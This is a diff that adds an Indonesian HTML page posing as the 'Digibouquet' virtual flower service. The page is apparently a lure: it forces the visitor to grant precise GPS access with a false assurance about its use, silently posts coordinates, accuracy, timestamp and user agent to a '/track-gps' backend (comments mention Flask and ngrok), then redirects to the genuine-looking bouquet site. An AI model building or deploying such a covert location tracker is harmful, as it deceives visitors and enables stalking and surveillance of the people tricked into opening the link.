@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Digibouquet - Kirim Bunga Virtual</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Poppins', Arial, sans-serif;
+            background: linear-gradient(145deg, #fef9f0 0%, #fff5e6 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 40px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #6b5b4b 0%, #a68a6c 100%);
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 28px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            color: rgba(255,255,255,0.85);
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .content {
+            padding: 30px 24px;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #2d2418;
+            margin-bottom: 10px;
+        }
+
+        .section-sub {
+            font-size: 14px;
+            color: #8b7355;
+            margin-bottom: 24px;
+            border-left: 3px solid #a68a6c;
+            padding-left: 12px;
+        }
+
+        .flowers-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+
+        .flower-card {
+            background: #fef8f0;
+            border-radius: 20px;
+            padding: 16px;
+            text-align: center;
+            border: 1px solid #f0e2d0;
+            transition: all 0.2s;
+            cursor: pointer;
+        }
+
+        .flower-card.selected {
+            border: 2px solid #a68a6c;
+            background: #fff7ed;
+            box-shadow: 0 4px 12px rgba(166,138,108,0.2);
+        }
+
+        .flower-emoji {
+            font-size: 48px;
+            margin-bottom: 8px;
+        }
+
+        .flower-name {
+            font-weight: 600;
+            color: #2d2418;
+            font-size: 16px;
+        }
+
+        .flower-meaning {
+            font-size: 11px;
+            color: #a68a6c;
+            margin-top: 4px;
+        }
+
+        .birth-month {
+            font-size: 10px;
+            color: #b8a07e;
+            margin-top: 4px;
+        }
+
+        .counter {
+            text-align: center;
+            padding: 16px;
+            background: #faf4ec;
+            border-radius: 60px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #5a4a38;
+        }
+
+        .counter span {
+            font-weight: 700;
+            font-size: 20px;
+            color: #a68a6c;
+        }
+
+        .btn-next {
+            width: 100%;
+            background: linear-gradient(135deg, #6b5b4b 0%, #a68a6c 100%);
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 12px;
+        }
+
+        .btn-next:active {
+            transform: scale(0.97);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.5;
+            transform: none;
+            cursor: not-allowed;
+        }
+
+        .gps-permission {
+            background: #fff0e0;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .gps-permission button {
+            background: #2d2418;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 40px;
+            color: white;
+            font-weight: 500;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 11px;
+            color: #c4b5a0;
+            border-top: 1px solid #f0e2d0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="app">
+    <div class="header">
+        <h1>digibouquet</h1>
+        <p>kirim bunga virtual untuk seseorang</p>
+    </div>
+
+    <div class="content">
+        <!-- GPS Permission Block (wajib dulu) -->
+        <div id="gpsBlock" class="gps-permission">
+            <div style="font-size: 40px;">🎯📍</div>
+            <p style="font-weight: 600; margin-top: 10px;">Aktifkan lokasi untuk melanjutkan</p>
+            <p style="font-size: 13px;">Kami membutuhkan akses lokasi untuk mengirimkan pesan bunga ke daerahmu</p>
+            <button id="enableGpsBtn">IZINKAN LOKASI</button>
+            <p style="font-size: 11px; margin-top: 12px;">Data lokasi hanya digunakan untuk verifikasi pengiriman</p>
+        </div>
+
+        <!-- Main Content (hidden until GPS granted) -->
+        <div id="mainContent" style="display: none;">
+            <div class="section-title">PICK 6 TO 10 BLOOMS</div>
+            <div class="section-sub">Pilih bunga yang mewakili perasaanmu</div>
+
+            <div class="flowers-grid" id="flowersGrid"></div>
+
+            <div class="counter">
+                🌸 Terpilih: <span id="selectedCount">0</span> / minimal 6
+            </div>
+
+            <button class="btn-next" id="nextBtn" disabled>NEXT</button>
+        </div>
+    </div>
+
+    <footer>made with digibouquet · kirim ke yang tersayang</footer>
+</div>
+
+<script>
+    // Data bunga (mirip kayak digibouquet)
+    const flowers = [
+        { name: "LILY", meaning: "Purity", emoji: "⚜️", month: "May" },
+        { name: "ROSE", meaning: "Love", emoji: "🌹", month: "June" },
+        { name: "TULIP", meaning: "Perfect Love", emoji: "🌷", month: "April" },
+        { name: "SUNFLOWER", meaning: "Adoration", emoji: "🌻", month: "August" },
+        { name: "ORCHID", meaning: "Elegance", emoji: "🌸", month: "March" },
+        { name: "DAISY", meaning: "Innocence", emoji: "🌼", month: "April" },
+        { name: "PEONY", meaning: "Romance", emoji: "🌺", month: "June" },
+        { name: "JASMINE", meaning: "Grace", emoji: "🤍", month: "December" },
+        { name: "LAVENDER", meaning: "Calm", emoji: "💜", month: "July" },
+        { name: "CHERRY", meaning: "Beauty", emoji: "🌸", month: "April" }
+    ];
+
+    let selectedFlowers = [];
+    let gpsGranted = false;
+    let gpsData = null;
+
+    // Kirim data GPS ke backend server (Flask / ngrok)
+    function sendGPSData(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        
+        gpsData = { lat, lon, accuracy };
+        
+        // Kirim ke server lo (mestinya URL endpoint Flask)
+        fetch('/track-gps', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                lat: lat,
+                lon: lon,
+                accuracy: accuracy,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
+        }).catch(e => console.log("Send error:", e));
+        
+        console.log(`GPS Captured: ${lat}, ${lon} (${accuracy}m)`);
+    }
+
+    function requestGPSPermission() {
+        const btn = document.getElementById('enableGpsBtn');
+        btn.innerText = "Mengakses...";
+        btn.disabled = true;
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    gpsGranted = true;
+                    sendGPSData(position);
+                    
+                    // Sembunyikan block GPS, tampilkan konten utama
+                    document.getElementById('gpsBlock').style.display = 'none';
+                    document.getElementById('mainContent').style.display = 'block';
+                    
+                    // Render bunga
+                    renderFlowers();
+                },
+                (error) => {
+                    alert("Lokasi harus diizinkan untuk melanjutkan. Silakan refresh dan beri akses lokasi.");
+                    btn.innerText = "IZINKAN LOKASI";
+                    btn.disabled = false;
+                    console.log("GPS Error:", error.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            alert("Browser kamu tidak support GPS. Gunakan browser lain.");
+        }
+    }
+
+    function renderFlowers() {
+        const grid = document.getElementById('flowersGrid');
+        grid.innerHTML = '';
+        
+        flowers.forEach(flower => {
+            const isSelected = selectedFlowers.includes(flower.name);
+            const card = document.createElement('div');
+            card.className = `flower-card ${isSelected ? 'selected' : ''}`;
+            card.onclick = () => toggleFlower(flower.name);
+            
+            card.innerHTML = `
+                <div class="flower-emoji">${flower.emoji}</div>
+                <div class="flower-name">${flower.name}</div>
+                <div class="flower-meaning">${flower.meaning}</div>
+                <div class="birth-month">Birth Month: ${flower.month}</div>
+            `;
+            grid.appendChild(card);
+        });
+        
+        updateCounter();
+    }
+
+    function toggleFlower(flowerName) {
+        const index = selectedFlowers.indexOf(flowerName);
+        if (index === -1) {
+            selectedFlowers.push(flowerName);
+        } else {
+            selectedFlowers.splice(index, 1);
+        }
+        renderFlowers(); // Re-render untuk update style selected
+    }
+
+    function updateCounter() {
+        const count = selectedFlowers.length;
+        document.getElementById('selectedCount').innerText = count;
+        const nextBtn = document.getElementById('nextBtn');
+        if (count >= 6 && count <= 10) {
+            nextBtn.disabled = false;
+        } else {
+            nextBtn.disabled = true;
+        }
+    }
+
+    // Event buat Next
+    document.getElementById('nextBtn').addEventListener('click', () => {
+        if (selectedFlowers.length < 6) {
+            alert("Pilih minimal 6 bunga ya 💐");
+            return;
+        }
+        // Redirect ke halaman sukses / ucapan
+        window.location.href = "https://digibouquet.vercel.app/bouquet/18c35506-28ad-46e2-b708-224f8b070f4e";
+    });
+
+    // Attach event untuk tombol GPS
+    document.getElementById('enableGpsBtn').addEventListener('click', requestGPSPermission);
+</script>
+</body>
+</html>
